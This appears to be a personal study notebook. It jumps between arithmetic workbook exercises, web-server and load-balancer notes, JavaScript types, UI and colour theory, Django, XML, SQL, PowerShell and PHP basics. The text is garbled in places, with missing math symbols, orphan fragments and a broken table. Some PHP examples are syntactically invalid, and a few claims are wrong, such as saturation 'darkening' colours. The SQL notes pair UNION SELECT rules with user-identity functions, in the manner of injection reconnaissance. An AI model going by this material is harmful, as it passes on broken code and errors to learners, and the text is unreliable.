## In mathematics, the assosiative property is a property of some binary operations, which means that rearranging the parentheses in a expression will not change the result . In propositional logic, assosiativity is a valid rule of replacement for the expressions in logical proofs.

  
  
◇ The associative property of addition says that when every operation is
addition, you can group numbers however you like and choose which pair
of numbers to add first; you can move parentheses without changing the
answer.  
◇ The associative property of multiplication says you can choose which
pair of numbers to multiply first, so when every operation is
multiplication, you can move parentheses without changing the answer.  
  
Here are some important rules for finding powers that contain 0 or 1:  
Every number raised to the power of 1 equals that number itself.  
Every number (except 0) raised to the power of 0 is equal to 1. For
example, 10 0 is 1 fol-  
lowed by no 0s — that is, 1.  
The number 0 raised to the power of any number (except 0) equals 0,
because no  
matter how many times you multiply 0 by itself, the result is 0.  
Mathematicians have decided that 0 0 is undefined — that is, it doesn’t
equal any number.  
The number 1 raised to the power of any number equals 1, because no
matter how  
many times you multiply 1 by itself, the result is 1.  
  
Q. What is  
A. 16. To find 256 , you want to find a  
number that, when multiplied by itself,  
equals 256. Try guessing to narrow down  
the possibilities. Start by guessing 10:  
256 ?  
10 · 10 = 100  
256 &gt; 100, so  
Guess 20:  
256 is greater than 10.  
20 · 20 = 400  
256 &lt; 400, so  
Guess 15:  
256 is between 10 and 20.  
15 · 15 = 225  
256 &gt; 225, so  
Guess 16:  
256 is between 15 and 20.  
16 · 16 = 256

• Absolute value is the positive value of a number  
**

## • Absolute Number:

In Mathematics, an absolute number or a modulus of a real number,
denoted |x|,is the non-negative value of x without regard to it's
sign.  
• Example: absolute value of 3 is 3  
• absolute value of -3 is 3  
• Absolute value is the positive value of a number, regardless of
whether you started out with a negative or positive number. It’s kind of
like the number’s distance from 0 on the number line:  
◇ The absolute value of a positive number is the same number.  
◇ The absolute value of a negative number makes it a positive number.  
◇ Placing absolute value bars around 0 doesn’t change its value, so |0|
= 0.  
◇ Placing a minus sign outside absolute value bars gives you a negative
result — for  
example, –|6| = –6, and –|–6| = –6.  
  
Q. Q. What’s the negation of 7 – 12?  
A. 5. First do the subtraction, which tells  
you 7 – 12 = –5. To find the negation of  
–5, attach a minus sign to the answer:  
–(–5). The two adjacent minus signs  
cancel out, which gives you 5.  
  
Evaluating Expressions with Addition  
and Subtraction  
When an expression has only addition and subtraction, in any
combination, it’s easy to  
evaluate: Just start with the first two numbers and continue from left
to right. Even when  
an expression includes negative numbers, the same procedure applies
(just make sure you  
use the correct rule for adding or subtracting negative numbers, as I
discuss in Chapter 3).

Checking for Leftovers: Divisibility Tests  
---------------------------------------------------------  
  
Understanding Factors and Multiples  
-----------------------------------------------------  
When you’re working with positive numbers, the  
factor is always the smaller number and the multiple is the bigger
number.  
  
Q.  
Which two of the following statements  
means the same thing as “18 is a multiple  
of 6”?  
a. 6 is a factor of 18.  
b. 18 is divisible by 6.  
c. 6 is divisible by 18.  
d. 18 is a factor of 6.  
  
A  
Choices a and b. The number 6 is the  
factor and 18 is the multiple, because 6  
is smaller than 18, so a is correct. And  
18 ÷ 6 = 3, so 18 is divisible by 6; there-  
fore, b is correct.  
  
Generating a Number’s Factors  
---------------------------------------------  
When one number is divisible by a second number, that second number is a
factor of the first.  
For example, 10 is divisible by 2, so 2 is a factor of 10.  
  
The lowest factor of every positive number is 1, and the highest factor
of every positive  
number is that number itself. For example, the lowest and highest
factors of 12 are 1 and 12.  
The rest of the factors fall somewhere in between these two numbers.  
Here’s how to find all the factors of a number:  
1. Write down 1 and the number itself (the lowest and highest factors),
leaving some  
space between them.  
2. Check for divisibility by 2.  
If the number is divisible by 2, write down 2 as the second-lowest
factor; divide the  
original number by 2 to get the second-highest factor.  
3. Check for divisibility by 3, 4, 5, and so on until the beginning of
the list meets the end.  
See the earlier section titled “Checking for Leftovers: Divisibility
Tests” for a few  
shortcuts.  
  
Decomposing a Number into Its Prime Factors  
-----------------------------------------------------------------  
Every number is the product of a unique set of prime factors, a group of
prime numbers  
(including repeats) that, when multiplied together, equals that number.
This section shows  
you how to find those prime factors for a given number, a process called
decomposition.  
An easy way to decompose a number is to make a factorization tree.
Here’s how:  
1. Find two numbers that multiply to equal the original number; write
them as num-  
bers that branch off the original one.  
Knowing the multiplication table can often help you here.  
2. If either number is prime, circle it and end that branch.  
3. Continue branching off non-prime numbers into two factors; whenever a
branch  
reaches a prime number, circle it and close the branch.  
When every branch ends in a circled number, you’re finished — just
gather up the  
circled numbers.  
  
Finding the Greatest Common Factor (GCF)  
--------------------------------------------------------------  
The greatest common factor (GCF) of a set of numbers is the highest
number that’s a factor of  
every number in that set. Finding the GCF is helpful when you want to
reduce a fraction to its  
lowest terms (see Chapter 6).  
You can find the GCF in two ways. The first option is to list all the
factors of the numbers and  
to choose the highest one that appears in both (or all) the lists. (For
info on finding factors,  
see the earlier section “Generating a Number’s Factors.”)  
The other method uses prime factors, which I discuss in the preceding
section. Here’s how to  
find the GCF:  
1. Decompose the numbers into their prime factors.  
2. Underline the factors that all the original numbers have in common.  
3. Multiply the underlined numbers to get the GCF.  
  
Q. Find the greatest common factor of 12 and 20.  
A.  
1) Write down all the factors of 12 and 20:  
▪ Factors of 12: 1, 2, 3, 4, 6, 12  
▪ Factors of 20: 1, 2, 4, 5, 10, 20  
The number 4 is the greatest number  
that appears on both lists, so it’s the  
GCF.  
  
  
Generating the Multiples of a Number  
------------------------------------------------------  
Generating the multiples of a number is easier than generating the
factors: Just multiply the  
number by 1, 2, 3, and so forth. But unlike the factors of a number —
which are always less  
than the number itself — the multiples of a number (except 0 and the
number itself) are  
greater than that number. Therefore, you can never write down all the
multiples of any  
number (except 0).  
  
Q. Find the first six (positive) multiples of 4.  
A. 4, 8, 12, 16, 20, 24. Write down the number 4 and keep adding 4 to it
until you’ve written down six numbers.  
  
Finding the Least Common Multiple (LCM)  
------------------------------------------------------------  

## The least common multiple (LCM) of a set of numbers is the lowest number that’s a multiple of every number in that set. For small numbers, you can simply list the first several multiples of

  
each number until you get a match.  
When you’re finding the LCM of two numbers, you may want to list the
multiples of the  
higher number first, stopping when the number of multiples you’ve
written down equals  
the lower number. Then list the multiples of the lower number and look
for a match.  
However, you may have to write down a lot of multiples with this method,
and the disadvan-  
tage becomes even greater when you’re trying to find the LCM of large
numbers. I recom-  
mend a method that uses prime factors when you’re facing big numbers or
more than two  
numbers. Here’s how:  
1. Write down the prime decompositions of all the numbers.  
See the earlier “Decomposing a Number into Its Prime Factors” section
for details.  
2. For each prime number you find, underline the most repeated
occurrences of each.  
In other words, compare the decompositions. If one breakdown contains
two 2s and  
another contains three 2s, you’d underline the three 2s. If one
decomposition contains  
one 7 and the rest don’t have any, you’d underline the 7.  
3. Multiply the underlined numbers to get the LCM.  
  
Q. Find the LCM of 12, 15, and 18.  
A. 180. Begin by writing the prime decom-  
positions of all three numbers. Then, for  
each prime number you find, underline  
the most repeated occurrences of each:  
12 = 2 · 2 · 3  
15 = 3 · 5  
18 = 2 · 3 · 3  
Notice that 2 appears in the decomposi-  
tion of 12 most often (twice), so I under-  
line both of those 2s. Similarly, 3 appears  
in the decomposition of 18 most often  
(twice), and 5 appears in the decomposi-  
tion of 15 most often (once). Now, multi-  
ply all the underlined numbers:  
2 · 2 · 3 · 3 · 5 = 180  
  
Borrowing from the Whole: Subtracting  
Mixed Numbers  
1. Find the difference of the fractional parts, reducing the result if
necessary.  
2. Find the difference of the whole-number parts.  
  
Here’s how you subtract mixed numbers when the fractional part of the
first number is less  
than that of the second number:  
1. Borrow 1 from the whole-number column and add it to the fraction
column, turning  
the top fraction into a mixed number.  
2. Change this new mixed number into an improper fraction.  
3. Use this result to subtract in the fraction column, reducing the
result if necessary.  
4. Perform the subtraction in the whole-number column.  
  
Q. Subtract 8 4 ⁄ 5 – 6 3 ⁄ 5 .  
A. 2 1 ⁄ 5 . To start out, set up the problem in  
column form:  
84  
5  
− 6 3  
5  
The fractional parts already have a  
common denominator, so subtract:  
4 − 3 = 1  
5 5 5  
Next, subtract the whole-number parts:  
8 – 6 = 2  
Here’s how the completed problem  
looks:  
84  
5  
− 6 3

\# Load balancers  
**Load Balancers**  
When a website's traffic starts getting quite large or is running an
application that needs to have high availability, one web server might
no longer do the job. Load balancers provide two main features, ensuring
high traffic websites can handle the load and providing a failover if a
server becomes unresponsive.When you request a website with a load
balancer, the load balancer will receive your request first and then
forward it to one of the multiple servers behind it. The load balancer
uses different algorithms to help it decide which server is best to deal
with the request. A couple of examples of these algorithms
are **round-robin**, which sends it to each server in turn,
or **weighted**, which checks how many requests a server is currently
dealing with and sends it to the least busy server.  
  
Load balancers also perform periodic checks with each server to ensure
they are running correctly; this is called a **health check**. If a
server doesn't respond appropriately or doesn't respond, the load
balancer will stop sending traffic until it responds appropriately
again.  
  
  
**CDN (Content Delivery Networks)**  
A CDN can be an excellent resource for cutting down traffic to a busy
website. It allows you to host static files from your website, such a
JavaScript, CSS, Images, Videos, and host them across thousands of
servers all over the world. When a user requests one of the hosted
files, the CDN works out where the nearest server is physically located
and sends the request there instead of potentially the other side of the
world.  
  
  
**WAF (Web Application Firewall)**  
A WAF sits between your web request and the web server; its primary
purpose is to protect the webserver from hacking or denial of service
attacks. It analyses the web requests for common attack techniques,
whether the request is from a real browser rather than a bot. It also
checks if an excessive amount of web requests are being sent by
utilising something called rate limiting, which will only allow a
certain amount of requests from an IP per second. If a request is deemed
a potential attack, it will be dropped and never sent to the
webserver.  
  

### What is a Web Server?

**  
**  
A web server is a software that listens for incoming connections and
then utilises the HTTP protocol to deliver web content to its clients.
The most common web server software you'll come across is Apache, Nginx,
IIS and NodeJS. A Web server delivers files from what's called its root
directory, which is defined in the software settings. For example, Nginx
and Apache share the same default location of /var/www/html in Linux
operating systems, and IIS uses C:\inetpub\wwwroot for the Windows
operating systems. So, for example, if you requested the
fileĀ <http://www.example.com/picture.jpg>, it would send the file
/var/www/html/picture.jpg from its local hard drive.  
  
**Virtual Hosts**  
Web servers can host multiple websites with different domain names; to
achieve this, they use virtual hosts. The web server software checks the
hostname being requested from the HTTP headers and matches that against
its virtual hosts (virtual hosts are just text-based configuration
files). If it finds a match, the correct website will be provided. If no
match is found, the default website will be provided instead.  
Virtual Hosts can have their root directory mapped to different
locations on the hard drive. For example, [one.com](http://one.com)
being mapped to /var/www/website\_one, and [two.com](http://two.com)
being mapped to /var/www/website\_two  
There's no limit to the number of different websites you can host on a
web server.

# Data types

  
There are 8 basic data types in JavaScript.  
• `number` for numbers of any kind: integer or floating-point, integers
are limited by `±(2`<sup>`53`</sup>`-1)`.  
• `bigint` is for integer numbers of arbitrary length.  
• `string` for strings. A string may have zero or more characters,
there’s no separate single-character type.  
• `boolean` for `true`/`false`.  
• `null` for unknown values – a standalone type that has a single value
`null`.  
• `undefined` for unassigned values – a standalone type that has a
single value `undefined`.  
• `object` for more complex data structures.  
• `symbol` for unique identifiers.  
  
The `typeof` operator allows us to see which type is stored in a
variable.

### UI vs UX vs WD

  
  
**Web Designer**: In charge of the frontend, everything user sees and
interacts with which includes colors, typography, shapes, spacing,
structure etc.  
  
**UX Designer**: Responsible for designing the frontend from a users
perspective. UX includes information architecture, user psychology,
usability testing, content strategy, wireframes, interaction designs
etc.  
  
**UI Designer**: Responsible for representation of the project itself.
UI is all about color, typography, spacing, sizing, shape etc.

# UI

  
• Basics of **Typography**  
  
▪ **What is Typography**: In web and mobile UI design, typography is the
art of  
organizing typefaces on the interface to make all copy readable, legible
and  
scalable to the audience.  
  
▪ **Fonts**: a font is a collection of letters and words with the same
weights, widths  
and styles, such as the well-known Times New Roman, Helvetica and
Garamond.  
  
▪ **Typfaces**: a typeface is a family of related fonts, like the
commonly-used Serif  
and Sans Serif.  
  
▪ **Letter and line spacing** - Letter and line spacing focuses on the
distance between  
the letters and lines. Both of them directly affect the readability of
your interface copy.  
  
▪ **Font weight, height and size** - The different weight, height and
size values define a  
font, helping designers create interfaces with different styles and
emotional tones.  
  
• **Letter** **and** **Line** **Spacing**:  
  
▪ **White Space**: White space, also referred to as negative space, is
the empty space between  
different elements and graphics. A website with proper white space
creates a clear layout and  
makes the webpage content easy to read.  
  
▪ **Text Spacing**: Apart from the space around the elements or block of
texts, you should also  
pay attention to space around the individual text itself, including the
letter and line spacings so  
you can create a more readable copy to deliver messages effectively.  
Here are two tips that may help you:  
  
- Use tighten letter spacing when designing for larger fonts or
typefaces, like headlines, banners  
and titles  
  
- Use looser letter spacing when designing smaller fonts or typefaces,
like body texts, error  
messages or notifications for easier legibility.  
  
  

# Color Theory

  
**• Primary Colors:** Primary colors form the basis for all other
shades. Humans perceive three base colors: magenta, cyan, and yellow.
Every other color we see consists of a combination of these three colors
in varying amounts, brightnesses, tints, and shades  
**  
• Hot and Cold:** Warm colors contain higher amounts of reds and
yellows. They can invoke a sense of warmth and passion in a design. They
can also feel very aggressive and bold — that’s why red is often used in
error messages. Cool colors contain higher amounts of blue, evoking
chilly climates, ice, winter, water, nighttime, death, and sadness. They
can carry connotations of loneliness, coldness, and fear. On the more
positive side, because cool colors are less aggressive, they can also be
soothing — think of a blue sky or calming blue waters on a beach.  
  
**• Color temperature:** Increasing an image’s temperature means
increasing its orange levels. It generally makes an image look warmer
and happier, similar to how the world looks happier when the sun casts
its orange glow upon it. In contrast, reducing an image’s temperature
makes it look colder and less inviting, like an overcast day.  
  
**• Tints and Shades:** You add white to a color to create a tint and
add black to create a shade. Tints and shades let you create monochrome
color schemes by adding varying levels of white and black to a base
color.  
  
**• Saturation:** Saturation describes the intensity of a color.
Increasing saturation makes the color richer and darker, while reducing
saturation makes it look faded and lighter. When we say “light blue” or
“dark green,” we’re describing changes in saturation.  
  
**• Hue:** Hue defines the degree to which a color can be described as
similar to or different from red, orange, yellow, green, blue, indigo,
and violet (the colors of the rainbow). So when you describe a color as
“blue-green,” you’re defining it in terms of two hues.  
**  
• Lightness:** Lightness, also known as value or tone, defines the
perceived brightness of a color compared to pure white.  
  
**• Color Wheel:** A basic color wheel contains the 12 standard colors
used to create color schemes. Each slice of the pie represents a family
of colors that can be achieved with different saturations, hues, tints,
shades, and mixes of neighboring colors. The [color
combinations](https://webflow.com/blog/best-color-combinations) (e.g.,
yellow-orange, red-orange) result from mixing equal amounts of the base
hues (yellow and orange, or red and orange).

# Backend

  

# Django

  
• src: <https://www.w3schools.com/django/django_intro.php>  

# MVT model

  
**

# MVT - Model, View & Template

  
• Model: The model provides data from the database.  
• View: A view is a function or method that takes http requests as
arguments,imports the relevant model(s), and finds out what data to send
to the template,and returns the final result.  
• Template: A template is a file where you describe how the result
should be represented.  
  

### How does it work with Django:

  
• Django receives the URL, checks the `urls.py` file, and calls the view
that matches the URL.  
• The view, located in `views.py`, checks for relevant models.  
• The models are imported from the `models.py` file.  
• The view then sends the data to a specified template in the `template`
folder.  
• The template contains HTML and Django tags, and with the data it
returns finished HTML content back to the browser  
  

# XML

  
***XML - eXtensible Markup Language***  
XPATH =&gt; xpath finder  
  
• XML is a software- and hardware-independent tool for storing and
transporting data.  
  
There are 5 pre-defined entity references in XML:  

<table class="table">
<thead>
<tr class="header">
<th>&amp;lt;</th>
<th>&lt;</th>
<th>less than</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>&amp;gt;</td>
<td>&gt;</td>
<td>greater than</td>
</tr>
<tr class="even">
<td>&amp;amp;</td>
<td>&amp;</td>
<td>ampersand¬†</td>
</tr>
<tr class="odd">

<td>'</td>
<td>apostrophe</td>

<td>"</td>
<td>quotation mark</td>
</tr>
</tbody>
</table>

# DBMS

  
**Relational Vs Non-Relational Databases:**  
A relational database, stores information in tables and often the tables
have shared information between them, they use columns to specify and
define the data being stored and rows to actually store the data. The
tables will often contain a column that has a unique ID (primary key)
which will then be used in other tables to reference it and cause a
relationship between the tables, hence the name **relational** database.

<span style="color:#a52a2a;">'Norway'</span>);  
  
◇ UNION SELECT  
For a `UNION` query to work, two key requirements must be met:  
• The individual queries must return the same number of columns.  
• The data types in each column must be compatible between the
individual queries.  
  
◇ NULL, IS NULL,IS NOT NULL  
▪ SYSTEM\_USER() , USER()  
▪ CURRENT\_USER()  
  
• Update &lt;t&gt; SET &lt;c&gt; = &lt;v&gt; WHERE &lt;condition&gt;  
• DELETE FROM *table\_name* WHERE *condition*;  
• SELECT TOP | LIMIT  
▪ SELECT \* FROM Customers LIMIT 3;  
▪ SELECT \* FROM Customers WHERE
Country=<span style="color:#a52a2a;">'Germany'</span> LIMIT 3;  
  
• The `MIN()` function returns the smallest value of the selected
column.  
• The `MAX()` function returns the largest value of the selected
column.  
  
• COUNT() //The `COUNT()` function returns the number of rows that
matches a specified criterion.  
▪ SELECT COUNT(*column\_name*)  
FROM *table\_name*  
WHERE *condition*;  
• AVG() // The `AVG()` function returns the average value of a numeric
column  
• SUM() // The `SUM()` function returns the total sum of a numeric
column.  
• LIKE The `LIKE` operator is used in a ` WHERE` clause to search for a
specified pattern in a column.  
There are two wildcards often used in conjunction with the ` LIKE`
operator:  
• The percent sign (%) represents zero, one, or multiple characters  
• The underscore sign (\_) represents one, single character  
The percent sign and the underscore can also be used in combinations!  
  
  
• Group\_concat(x,x2)

# Scripting

  

# Powershell

  

# Getting Started

  
Powershell is the Windows Scripting Language and shell environment that
is built using the .NET framework.  
  
This also allows Powershell to execute .NET functions directly from its
shell. Most Powershell commands, called *cmdlets,* are written in .NET.
Unlike other scripting languages and shell environments, the output of
these *cmdlets* are objects - making Powershell somewhat object
oriented. This also means that running cmdlets allows you to perform
actions on the output object(which makes it convenient to pass output
from one *cmdlet* to another). The normal format of a *cmdlet* is
represented using **Verb-Noun**  
  
Get-Help displays information about a *cmdlet.* To get help about a
particular command, run the following:  
`Get-Help Command-Name`  
You can also understand how exactly to use the command by passing in the
`-examples` flag

\# Declaring a variable  
&lt;? php

$x = 5;  
$y = 10.5;  
echo "hello " $x " UwU"; // output formating   
?&gt;  
  
/\*   
After the execution of the statements above, the variable $txt will hold the value Hello world!, the variable $x will hold the value 5, and the variable $y will hold the value 10.5.  
  
\* Unlike other programming languages, PHP has no command for declaring a variable. It is created the moment you first assign a value to it.  
  
Rules for PHP variables:  
  
    A variable starts with the $ sign, followed by the name of the variable  
    A variable name must start with a letter or the underscore character  
    A variable name cannot start with a number  
    A variable name can only contain alpha-numeric characters and underscores (A-z, 0-9, and \_ )  
    Variable names are case-sensitive ($age and $AGE are two different variables)  
  
\*/

# Scope

  

PHP has three different variable scopes:  
  
    local  
    global  
    static  
  
Global:  
A variable declared outside a function has a GLOBAL SCOPE and can only be accessed outside a function:  
  
Local:  
A variable declared within a function has a LOCAL SCOPE and can only be accessed within that function  
  
keyword:  
global  
\* The global keyword is used to access a global variable from within a function. To do this, use the global keyword before the variables (inside the function)  
\* PHP also stores all global variables in an array called $GLOBALS\[index\]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.  
  
  
PHP The static Keyword  
Normally, when a function is completed/executed, all of its variables are deleted. However, sometimes we want a local variable NOT to be deleted. We need it for a further job.  
  
To do this, use the static keyword when you first declare the variable  
  
  
  
 &lt;?php  
$x = 5;  
$y = 10;  
  
function myTest() {  
  $GLOBALS\['y'\] = $GLOBALS\['x'\] + $GLOBALS\['y'\];  
}  
  
myTest();  
echo $y; // outputs 15

# Concepts

  

Object Oriented Concepts  
  
Before we go in detail, lets define important terms related to Object Oriented Programming.  
  
    Class − This is a programmer-defined data type, which includes local functions as well as local data. You can think of a class as a template for making many instances of the same kind (or class) of object.  
  
    Object − An individual instance of the data structure defined by a class. You define a class once and then make many objects that belong to it. Objects are also known as instance.  
  
    Member Variable − These are the variables defined inside a class. This data will be invisible to the outside of the class and can be accessed via member functions. These variables are called attribute of the object once an object is created.  
  
    Member function − These are the function defined inside a class and are used to access object data.  
  
    Inheritance − When a class is defined by inheriting existing function of a parent class then it is called inheritance. Here child class will inherit all or few member functions and variables of a parent class.  
  
    Parent class − A class that is inherited from by another class. This is also called a base class or super class.  
  
    Child Class − A class that inherits from another class. This is also called a subclass or derived class.  
  
    Polymorphism − This is an object oriented concept where same function can be used for different purposes. For example function name will remain same but it take different number of arguments and can do different task.  
  
    Overloading − a type of polymorphism in which some or all of operators have different implementations depending on the types of their arguments. Similarly functions can also be overloaded with different implementation.  
  
    Data Abstraction − Any representation of data in which the implementation details are hidden (abstracted).  
  
    Encapsulation − refers to a concept where we encapsulate all the data and member functions together to form an object.  
  
    Constructor − refers to a special type of function which will be called automatically whenever there is an object formation from a class.  
  
    Destructor − refers to a special type of function which will be called automatically whenever an object is deleted or goes out of scope.  

# Classes

  

Define a Class  
  
A class is defined by using the class keyword, followed by the name of the class and a pair of curly braces ({}). All its properties and methods go inside the braces:  
Syntax  
&lt;?php  
class Fruit {  
  // code goes here...  
}  
?&gt;  

# Loops

  

 

# While

  

Syntax:  
while (condition is true) {  
  code to be executed;  
}  
  
  
  

# ForEach

  

The following example will output both the keys and the values of the given array ($age):  
Example  
&lt;?php  
$age = array("Peter"=&gt;"35", "Ben"=&gt;"37", "Joe"=&gt;"43");  
  
foreach($age as $x =&gt; $val) {  
  echo "$x = $val&lt;br&gt;";  
}  
?&gt;   
  
The following example will output the values of the given array ($colors):  
Example  
&lt;?php  
$colors = array("red", "green", "blue", "yellow");  
  
foreach ($colors as $value) {  
  echo "$value &lt;br&gt;";  
}  
?&gt; 

# For

  

 

# do while

  

|============================|  
do   
{  
  code to be executed;  
} while (condition is true);   
|============================|  
  
&lt;?php  
$color = array("I","Love","Lucija");  
foreach ($color as $x)  
{  
echo $x;  
}  
?&gt;

# if else

  

if (condition) {  
  code to be executed if this condition is true;  
} elseif (condition) {  
  code to be executed if first condition is false and this condition is true;  
} else {  
  code to be executed if all conditions are false;  
} 

# Hello World

  

&lt;? php   
echo "Hello,World\n";  
echo "This is a string\n";  
 ?&gt;  
   
 # echo , print =&gt; output's a string  
 # Semicolon is must  
 /\* multi-line comment \*/  
 

# Global Variables

  

Some predefined variables in PHP are "superglobals", which means that they are always accessible, regardless of scope - and you can access them from any function, class or file without having to do anything special.  
  
The PHP superglobal variables are:  
  
    $GLOBALS  
    $\_SERVER  
    $\_REQUEST  
    $\_POST  
    $\_GET  
    $\_FILES  
    $\_ENV  
    $\_COOKIE  
    $\_SESSION  
  

# Getting Started

  

PHP code is executed on the server.  
  
What is PHP?  
    PHP is an acronym for "PHP: Hypertext Preprocessor"  
    PHP is a widely-used, open source scripting language  
    PHP scripts are executed on the server  
    PHP is free to download and use  

# Functions

  

function functionName() {  
  code to be executed;  
}   
  
To specify strict we need to set declare(strict\_types=1);. This must be on the very first line of the PHP file.  
  
In the following example we try to send both a number and a string to the function, but here we have added the strict declaration:  
Example  
&lt;?php declare(strict\_types=1); // strict requirement  
  
function addNumbers(int $a, int $b) {  
  return $a + $b;  
}  
echo addNumbers(5, "5 days");  
// since strict is enabled and "5 days" is not an integer, an error will be thrown  
?&gt;   
  
&lt;?php  
   declare(strict\_types = 1);  
   function returnIntValue(int $value): int {  
      return $value;  
   }  
   print(returnIntValue(5));  
?&gt;  
------------------------------------------------------------\_---------------------------------------------\_-----------------------------------------------\_  
Since PHP 7.0, some of the harmful effects of type juggling can be mitigated with strict typing. By including this declare statement as the first line of the file, PHP will enforce parameter type declarations and return type declarations by throwing a TypeError exception.  
  
declare(strict\_types=1);  
  
For example, this code, using parameter type definitions, will throw a catchable exception of type TypeError when run:  
  
&lt;?php  
declare(strict\_types=1);  
  
function sum(int $a, int $b) {  
    return $a + $b;  
}  
  
echo sum("1", 2);  
  
Likewise, this code uses a return type declaration; it will also throw an exception if it tries to return anything other than an integer:  
  
&lt;?php  
declare(strict\_types=1);  
  
function returner($a): int {  
    return $a;  
}  
  
returner("this is a string");  
  
--------------------------------------------------------------------------------------------------------  
  
PHP Default Argument Value  
  
The following example shows how to use a default parameter. If we call the function setHeight() without arguments it takes the default value as argument:  
Example  
&lt;?php declare(strict\_types=1); // strict requirement  
function setHeight(int $minheight = 50) {  
  echo "The height is : $minheight &lt;br&gt;";  
}  
  
setHeight(350);  
setHeight(); // will use the default value of 50  
setHeight(135);  
setHeight(80);  
?&gt; 

# Data Types

  

PHP supports the following data types:  
  
    String  
     $x = "Hello world!";  
$y = 'Hello world!';  
  
    Integer  
     An integer data type is a non-decimal number between 
-2,147,483,648 and 2,147,483,647.  
     Integers can be specified in: decimal (base 10), 
hexadecimal (base 16), octal (base 8), or binary (base 2) notation  
    $x is an integer. The PHP var\_dump() function returns the data type and value  
      
    Float (floating point numbers - also called double)  
     $x = 10.365;  
      
    Boolean  
     $x = true;  
$y = false;  
  
    Array  
     $cars = array("Volvo","BMW","Toyota");  
var\_dump($cars);  
  
    Object  
    NULL  
     $x = null;  
    Resource  
  
dumping the data type and value:  
var\_dump($variable);

# Type C0nverti0n

  

Data types in php gets automactically type casted corresponding to the data type they are working with  
  
 The casts allowed are:  
  
    (int), (integer) - cast to int  
    (bool), (boolean) - cast to bool  
    (float), (double), (real) - cast to float  
    (string) - cast to string  
    (array) - cast to array  
    (object) - cast to object  
    (unset) - cast to NULL  

# Strings

  

\# Sum functions  
  
strlen()  
str\_word\_count()   
strrev() = reverses a str  
strpos() = The PHP strpos() function searches for a specific text within a string. If a match is found, the function returns the character position of the first match. If no match is found, it will return FALSE.  
strpos("Hello world!", "world")  
  
str\_replace()  
str\_replace("world", "Dolly", "Hello world!");  
  
PHP Numerical Strings  
  
The PHP is\_numeric() function can be used to find whether a variable is numeric. The function returns true if the variable is a number or a numeric string, false otherwise.  
Example  
  
Check if the variable is numeric:  
&lt;?php  
$x = 5985;  
var\_dump(is\_numeric($x));  
  
$x = "5985";  
var\_dump(is\_numeric($x));  
  
$x = "59.85" + 100;  
var\_dump(is\_numeric($x));  
  
$x = "Hello";  
var\_dump(is\_numeric($x));  
?&gt; 

# NaN

  

PHP NaN  
  
NaN stands for Not a Number.  
  
NaN is used for impossible mathematical operations.  
  
PHP has the following functions to check if a value is not a number:  
  
    is\_nan()  
  
However, the PHP var\_dump() function returns the data type and value:  
 &lt;?php  
$x = acos(8);  
var\_dump($x);  
?&gt; 

# Integer

  

An integer data type is a non-decimal number between -2147483648 and 2147483647 in 32 bit systems, and between -9223372036854775808 and 9223372036854775807 in 64 bit systems. A value greater (or lower) than this, will be stored as float, because it exceeds the limit of an integer.  
  
PHP has the following predefined constants for integers:  
  
    PHP\_INT\_MAX - The largest integer supported  
    PHP\_INT\_MIN - The smallest integer supported  
    PHP\_INT\_SIZE -  The size of an integer in bytes  
  
PHP has the following functions to check if the type of a variable is integer:  
  
    is\_int()  
    is\_integer() - alias of is\_int()  
    is\_long() - alias of is\_int()  
  
  
 &lt;?php  
$x = 5985;  
var\_dump(is\_int($x));  
  
$x = 59.85;  
var\_dump(is\_int($x));  
?&gt;   
  
Note: Another important thing to know is that even if 4 \* 2.5 is 10, the result is stored as float, because one of the operands is a float (2.5).  
  

# Infinity

  

A numeric value that is larger than PHP\_FLOAT\_MAX is considered infinite.  
  
PHP has the following functions to check if a numeric value is finite or infinite:  
  
    is\_finite()  
    is\_infinite()  
  
However, the PHP var\_dump() function returns the data type and value:  
  
 &lt;?php  
$x = 1.9e411;  
var\_dump($x);  
?&gt; 

# Float

  

A float is a number with a decimal point or a number in exponential form.  
  
2.0, 256.4, 10.358, 7.64E+5, 5.56E-5 are all floats.  
  
The float data type can commonly store a value up to 1.7976931348623E+308 (platform dependent), and have a maximum precision of 14 digits.  
  
PHP has the following predefined constants for floats (from PHP 7.2):  
  
    PHP\_FLOAT\_MAX - The largest representable floating point number  
    PHP\_FLOAT\_MIN - The smallest representable positive floating point number  
    - PHP\_FLOAT\_MAX - The smallest representable negative floating point number  
    PHP\_FLOAT\_DIG - The number of decimal digits that can be rounded into a float and back without precision loss  
    PHP\_FLOAT\_EPSILON - The smallest representable positive number x, so that x + 1.0 != 1.0  
  
PHP has the following functions to check if the type of a variable is float:  
  
    is\_float()  
    is\_double() - alias of is\_float()  
  
 &lt;?php  
$x = 10.365;  
var\_dump(is\_float($x));  
?&gt;   

# Boolean

  

$x  = true  
$y = false  
  
Here , 0 is false, true is 1

# Constants

  

define(name,value,case-insensitiv)  
  
\*  array  
define("cars",\[  
"alfa romeo",  
"bmw",  
"toyota"  
\]);  
  
  
Constants are automatically global and can be used across the entire script  
  

# Keywords

  

\* global  
$GLOBAL\['name'\]  
  
\* Static

# Arrays

  

An array stores multiple values in one single variable:  
Example  
&lt;?php  
$cars = array("Volvo", "BMW", "Toyota");  
echo "I like " . $cars\[0\] . ", " . $cars\[1\] . " and " . $cars\[2\] . ".";  
?&gt;   
  
  
count all the elements in array  
----------------------------------------------  
count()  
  
  
Loop Through an Indexed Array  
----------------------------------------------  
To loop through and print all the values of an indexed array, you could use a for loop, like this:  
Example  
&lt;?php  
$cars = array("Volvo", "BMW", "Toyota");  
$arrlength = count($cars);  
  
for($x = 0; $x &lt; $arrlength; $x++) {  
  echo $cars\[$x\];  
  echo "&lt;br&gt;";  
}  
?&gt;   
  
         Dictionaries  
&lt;==---------------------==&gt;  
PHP Associative Arrays  
  
Associative arrays are arrays that use named keys that you assign to them.  
  
There are two ways to create an associative array:   
$age = array("Peter"=&gt;"35", "Ben"=&gt;"37", "Joe"=&gt;"43");  
  
$age\['Peter'\] = "35";  
$age\['Ben'\] = "37";  
$age\['Joe'\] = "43";

We can store the data from the table above in a two-dimensional array, like this:  
$cars = array (  
  array("Volvo",22,18),  
  array("BMW",15,13),  
  array("Saab",5,2),  
  array("Land Rover",17,15)  
);  
  
Now the two-dimensional $cars array contains four arrays, and it has two indices: row and column.  
  
To get access to the elements of the $cars array we must point to the two indices (row and column):  
Example  
&lt;?php  
echo $cars\[0\]\[0\].": In stock: ".$cars\[0\]\[1\].", sold: ".$cars\[0\]\[2\].".&lt;br&gt;";  
echo $cars\[1\]\[0\].": In stock: ".$cars\[1\]\[1\].", sold: ".$cars\[1\]\[2\].".&lt;br&gt;";  
